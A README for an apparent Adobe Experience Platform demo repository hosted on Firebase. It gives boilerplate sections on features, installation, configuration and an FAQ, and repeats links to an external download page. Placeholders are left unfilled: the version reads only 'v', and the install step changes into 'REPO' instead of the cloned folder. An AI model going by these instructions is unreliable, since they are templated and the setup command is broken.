# AEP Orchestration Lab - demo lab 2026

> **Adobe Experience Platform demo lab for decisioning and profile tooling, delivered with Firebase hosting and Cloud Functions support in a focused 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Adobe%20Experience%20Platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonking52/aep-orchestration-lab-2026?style=flat-square)](https://github.com/brandonking52/aep-orchestration-lab-2026)

---

<p align="center">
  <a href="https://brandonking52.github.io/aep-orchestration-lab-2026/">
    <img src="https://img.shields.io/badge/Download-AEP%20Orchestration%20Lab%20Latest-brightgreen?style=for-the-badge" alt="Download AEP Orchestration Lab">
  </a>
</p>

> **[Direct Download - AEP Orchestration Lab v](https://brandonking52.github.io/aep-orchestration-lab-2026/)**

---

[Download Latest Build](https://brandonking52.github.io/aep-orchestration-lab-2026/)

---

## Overview

AEP Orchestration Lab is a demo-first environment centered on Adobe Experience Platform workflows. It combines decisioning concepts with profile tools so teams can examine orchestration patterns without having to assemble a full stack from the ground up.

The project is also set up for browser delivery and demo publishing, with Firebase hosting and Cloud Functions included in the repository profile. As a result, it works well for showing AEP-related flows, trying out simple interactions, or building a guided demo environment for internal audiences or client presentations.

---

## What it includes

- Decisioning workflow examples for Adobe Experience Platform demos
- Profile tools for exploring or supporting audience-related scenarios
- Firebase hosting for web-based delivery
- Cloud Functions integration for server-side demo logic
- Built for lab-style experimentation and walkthroughs
- Suited to orchestration demos and presentation environments
- Organized as a lightweight platform-focused demo repository

---

## Installation

Clone or download the repository, then open the project folder locally:

```bash
git clone https://github.com/brandonking52/aep-orchestration-lab-2026.git
cd REPO
```

If you are working with the hosted demo build, use the latest download link and open the deployed site after publishing. For local preview or deployment, follow the Firebase setup used by the repository and start the project from the source files.

---

## Usage

Use the lab to inspect orchestration flows, validate decisioning ideas, or present profile-based demo scenarios connected to Adobe Experience Platform.

Typical workflow:

1. Open the lab in your browser or local environment.
2. Follow the decisioning path or profile tool flow you want to demonstrate.
3. Update demo content or function logic as needed.
4. Redeploy to Firebase when you are ready to publish changes.

If your deployment includes Cloud Functions, test those endpoints after each change so the demo behavior matches the current configuration.

---

## Configuration

Project settings are usually managed through the Firebase app configuration and any Cloud Functions source used by the lab. If environment values are required, keep them in the deployment settings or local environment files used by your build process.

Example pattern:

```json
{
  "firebase": {
    "hosting": true,
    "functions": true
  },
  "aep": {
    "mode": "demo"
  }
}
```

Adjust the values to match your own orchestration demo setup and hosting target.

---

## Requirements

- Adobe Experience Platform-oriented demo workflow
- Firebase project for hosting
- Cloud Functions support if server-side demo logic is used
- A modern web browser for viewing the lab
- Source access for editing HTML and related assets

---

## FAQ

**Is this intended for production use?**  
No. The repository is framed as a demo lab, so it should be treated as an experimentation and presentation environment.

**Where should I change the hosting setup?**  
Look in the Firebase configuration and deployment files within the project structure.

**How do I modify the decisioning or profile flow?**  
Edit the relevant demo pages or function logic, then redeploy the updated build.

**What if the hosted version does not reflect my local changes?**  
Rebuild and republish the Firebase deployment, and confirm that the latest files were uploaded.

**How do I get support or updates?**  
Check repository activity, release history, or guidance from the project owner if it is available.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
